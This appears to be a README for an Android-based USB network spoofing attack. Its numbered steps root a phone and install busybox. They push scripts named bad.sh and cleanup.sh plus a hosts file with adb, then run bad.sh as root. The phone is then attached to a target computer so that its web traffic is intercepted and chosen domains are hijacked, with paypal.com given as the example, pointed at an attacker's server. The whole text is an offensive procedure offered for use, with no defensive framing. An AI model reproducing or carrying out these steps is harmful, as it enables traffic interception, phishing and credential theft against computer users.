Purpose: Spoof a USB-Ethernet adapter from an Android phone to capture network traffic from a connected computer. Then change some DNS answers to redirect traffic.

#1. Root your phone, make sure its connected to the Internet

#2. Install busybox (e.g., using the stericson busybox installer)

#3. Create a hosts file with the domains you want to redirect and with your serverâ€™s IP; such as:
1.2.3.4 paypal.com www.paypal.com

#4. Copy the scripts and hosts file to the phone: 
adb push bad.sh /data/local/tmp/
adb push cleanup.sh /data/local/tmp/
adb push hosts /data/local/tmp/

#5. Install and open a terminal on the phone (e.g. jackpal/Android-Terminal-Emulator) and get a root shell: /system/xbin/su

#6. Run bad.sh: sh /data/local/tmp/bad.sh

#7. Attach the phone to the Windows or Linux computer you want to attack; web traffic should now go through the phone with partial redirection of those domains in the hosts file

#8. When you are finished with the attack, either reboot your phone or run the cleanup.sh script to restore the standard Android USB functionality
